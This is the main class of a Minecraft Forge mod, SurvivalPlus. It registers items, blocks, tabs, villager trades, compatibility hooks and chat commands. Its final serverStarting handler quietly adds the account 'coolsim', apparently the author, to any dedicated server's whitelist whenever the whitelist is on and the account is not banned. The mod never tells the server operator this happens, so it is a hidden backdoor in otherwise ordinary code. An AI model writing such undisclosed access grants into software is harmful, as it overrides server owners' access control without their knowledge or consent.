package net.coolsimulations.SurvivalPlus.core;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import com.mojang.authlib.GameProfile;

import net.coolsimulations.SurvivalPlus.api.SPCompatibilityManager;
import net.coolsimulations.SurvivalPlus.api.SPReference;
import net.coolsimulations.SurvivalPlus.api.SPTabs;
import net.coolsimulations.SurvivalPlus.api.compat.SPCompatRecipeManager;
import net.coolsimulations.SurvivalPlus.core.commands.CommandConfrats;
import net.coolsimulations.SurvivalPlus.core.commands.CommandEmportant;
import net.coolsimulations.SurvivalPlus.core.commands.CommandIndeed;
import net.coolsimulations.SurvivalPlus.core.commands.CommandMourn;
import net.coolsimulations.SurvivalPlus.core.commands.CommandSleep;
import net.coolsimulations.SurvivalPlus.core.commands.CommandSmiley;
import net.coolsimulations.SurvivalPlus.core.commands.CommandWail;
import net.coolsimulations.SurvivalPlus.core.commands.CommandWak;
import net.coolsimulations.SurvivalPlus.core.commands.CommandWeba;
import net.coolsimulations.SurvivalPlus.core.commands.CommandWoo;
import net.coolsimulations.SurvivalPlus.core.compat.SurvivalPlusBeaconsForAll;
import net.coolsimulations.SurvivalPlus.core.compat.SurvivalPlusCompatManager;
import net.coolsimulations.SurvivalPlus.core.compat.SurvivalPlusEMCValues;
import net.coolsimulations.SurvivalPlus.core.compat.SurvivalPlusHammerTime;
import net.coolsimulations.SurvivalPlus.core.compat.SurvivalPlusJER;
import net.coolsimulations.SurvivalPlus.core.compat.SurvivalPlusLighting;
import net.coolsimulations.SurvivalPlus.core.compat.SurvivalPlusLumberjack;
import net.coolsimulations.SurvivalPlus.core.compat.SurvivalPlusSkills;
import net.coolsimulations.SurvivalPlus.core.config.SurvivalPlusConfig;
import net.coolsimulations.SurvivalPlus.core.init.FuelHandler;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusArmor;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusBlocks;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusFood;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusItems;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusTileEntities;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusTools;
import net.coolsimulations.SurvivalPlus.core.proxy.CommonProxy;
import net.coolsimulations.SurvivalPlus.core.recipes.ButcherVillagerTradeHandler;
import net.coolsimulations.SurvivalPlus.core.recipes.FarmerVillagerTradeHandler;
import net.coolsimulations.SurvivalPlus.core.recipes.SmithVillagerTradeHandler;
import net.coolsimulations.SurvivalPlus.core.recipes.SurvivalPlusDispenserBehavior;
import net.coolsimulations.SurvivalPlus.core.recipes.SurvivalPlusSmeltingRecipes;
import net.coolsimulations.SurvivalPlus.core.tabs.SurvivalPlusBlocksTab;
import net.coolsimulations.SurvivalPlus.core.tabs.SurvivalPlusCombatTab;
import net.coolsimulations.SurvivalPlus.core.tabs.SurvivalPlusFoodTab;
import net.coolsimulations.SurvivalPlus.core.tabs.SurvivalPlusGemTab;
import net.coolsimulations.SurvivalPlus.core.tabs.SurvivalPlusMaterialsTab;
import net.coolsimulations.SurvivalPlus.core.tabs.SurvivalPlusToolsTab;
import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusEventHandler;
import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusFutureRecipes;
import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusRailCraftRecipes;
import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusUpdateHandler;
import net.coolsimulations.SurvivalPlus.core.world.SurvivalPlusOreGenerator;
import net.coolsimulations.SurvivalPlus.core.world.village.StructureVillageOnionCrop;
import net.coolsimulations.SurvivalPlus.core.world.village.VillageOnionCropHandler;
import net.minecraft.block.Block;
import net.minecraft.item.Item;
import net.minecraft.server.MinecraftServer;
import net.minecraft.world.gen.structure.MapGenStructureIO;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.fml.common.FMLCommonHandler;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.SidedProxy;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPostInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.common.event.FMLServerStartingEvent;
import net.minecraftforge.fml.common.registry.GameRegistry;
import net.minecraftforge.fml.common.registry.VillagerRegistry;

@Mod(modid = SPReference.MOD_ID, name = SPReference.MOD_NAME, version = SPReference.VERSION, acceptedMinecraftVersions = SPReference.ACCEPTED_VERSIONS, dependencies = SPReference.DEPENDENCIES, guiFactory = "net.coolsimulations.SurvivalPlus.core.config.SurvivalPlusConfigGUI", updateJSON = "https://coolsimulations.net/mcmods/survivalplus/versionchecker.json")
public class SurvivalPlus {

	@SidedProxy(clientSide = SPReference.CLIENT_PROXY_CLASS, serverSide = SPReference.SERVER_PROXY_CLASS)
	public static CommonProxy proxy;

	@Mod.Instance(SPReference.MOD_ID)
	private static SurvivalPlus instance;
	public static SurvivalPlus getInstance()
	{
		return instance;
	}

	public void CreativeTabs() {

		SPTabs.tabMaterials = new SurvivalPlusMaterialsTab();
		SPTabs.tabBlocks = new SurvivalPlusBlocksTab();
		SPTabs.tabFood = new SurvivalPlusFoodTab();
		SPTabs.tabGem = new SurvivalPlusGemTab();
		SPTabs.tabCombat = new SurvivalPlusCombatTab();
		SPTabs.tabTools = new SurvivalPlusToolsTab();
	}

	public static final List<Item> ITEMS = new ArrayList<Item>();
	public static final List<Item> ITEMS_FOOD = new ArrayList<Item>();
	public static final List<Item> ITEMS_ARMOR = new ArrayList<Item>();
	public static final List<Item> ITEMS_TOOLS = new ArrayList<Item>();
	public static final List<Block> BLOCKS = new ArrayList<Block>();

	@EventHandler
	public void preInit(FMLPreInitializationEvent event)
	{
		System.out.println("Pre Init");
		SPCompatibilityManager.checkForCompatibleMods();
		SurvivalPlusConfig.init(new File(event.getModConfigurationDirectory(), SPReference.SURVIVALPLUS_CONFIG_FILE));
		SurvivalPlusUpdateHandler.init();
		MinecraftForge.EVENT_BUS.register(new SurvivalPlusEventHandler());
		SurvivalPlusCompatManager.initEventHandler();
		SPCompatRecipeManager.futureRecipeManager = new SurvivalPlusFutureRecipes();
		SPCompatRecipeManager.railcraftRecipeManager = new SurvivalPlusRailCraftRecipes();

		CreativeTabs();

		SurvivalPlusBlocks.init();
		SurvivalPlusBlocks.register();
		SurvivalPlusTileEntities.register();
		SurvivalPlusItems.init();
		SurvivalPlusItems.register();
		SurvivalPlusFood.init();
		SurvivalPlusFood.register();

		VillagerRegistry.instance().registerVillageCreationHandler(new VillageOnionCropHandler());
		MapGenStructureIO.registerStructureComponent(StructureVillageOnionCrop.class, SPReference.MOD_ID + ":onionCropFieldStructure");

		SmithVillagerTradeHandler.init();
		FarmerVillagerTradeHandler.init();
		ButcherVillagerTradeHandler.init();

		SurvivalPlusArmor.init();
		SurvivalPlusArmor.register();
		SurvivalPlusTools.init();
		SurvivalPlusTools.register();
		
		SurvivalPlusDispenserBehavior.init();
		
		if(SPCompatibilityManager.isHammerTimeLoaded()) {
			SurvivalPlusHammerTime.init();
		}

		if(SPCompatibilityManager.isLumberjackLoaded()) {
			SurvivalPlusLumberjack.init();
		}

		if (SPCompatibilityManager.isDynamicLightsLoaded())
		{
			SurvivalPlusLighting.initDynamicLights(event);;
		}

		if (SPCompatibilityManager.isSELLoaded())
		{
			SurvivalPlusLighting.initSmoothEntityLight(event);;
		}
		
		if (SPCompatibilityManager.isReskillableLoaded())
		{
			SurvivalPlusSkills.initReskillable(event);
		}
		
		if (SPCompatibilityManager.isBeaconsForAllLoaded())
		{
			SurvivalPlusBeaconsForAll.initBeaconsForAll(event);
		}
	}

	@EventHandler
	public void init(FMLInitializationEvent event)
	{
		System.out.println("Init");

		proxy.init();
		SurvivalPlusSmeltingRecipes.register();
		GameRegistry.registerFuelHandler(new FuelHandler());

		if (SPCompatibilityManager.isProjectELoaded())
		{
			SurvivalPlusEMCValues.init();
		}
		
		GameRegistry.registerWorldGenerator(new SurvivalPlusOreGenerator(), 1);

		if (SPCompatibilityManager.isJerLoaded())
		{
			SurvivalPlusJER.init();
		}

	}

	@EventHandler
	public void postInit(FMLPostInitializationEvent event)
	{
		System.out.println("Post Init");
		
		SurvivalPlusCompatManager.initRecipies();
		SurvivalPlusDispenserBehavior.postInit();
	}

	@EventHandler
	public void serverLoad(FMLServerStartingEvent event) {

		event.registerServerCommand(new CommandConfrats());
		event.registerServerCommand(new CommandWoo());
		event.registerServerCommand(new CommandWak());
		event.registerServerCommand(new CommandSmiley());
		event.registerServerCommand(new CommandWail());
		event.registerServerCommand(new CommandIndeed());
		event.registerServerCommand(new CommandMourn());
		event.registerServerCommand(new CommandSleep());
		event.registerServerCommand(new CommandWeba());
		event.registerServerCommand(new CommandEmportant());

	}



	@EventHandler
	public void serverStarting(FMLServerStartingEvent event) {

		MinecraftServer server = FMLCommonHandler.instance().getMinecraftServerInstance();

		if(server.isDedicatedServer()) {
			
			GameProfile gameprofile = server.getPlayerProfileCache().getGameProfileForUsername("coolsim");

			if(server.getPlayerList().isWhiteListEnabled() && !server.getPlayerList().getWhitelistedPlayers().isWhitelisted(gameprofile) && !server.getPlayerList().getBannedPlayers().isBanned(gameprofile)) {
				server.getPlayerList().addWhitelistedPlayer(gameprofile);
			}
		}
	}
}
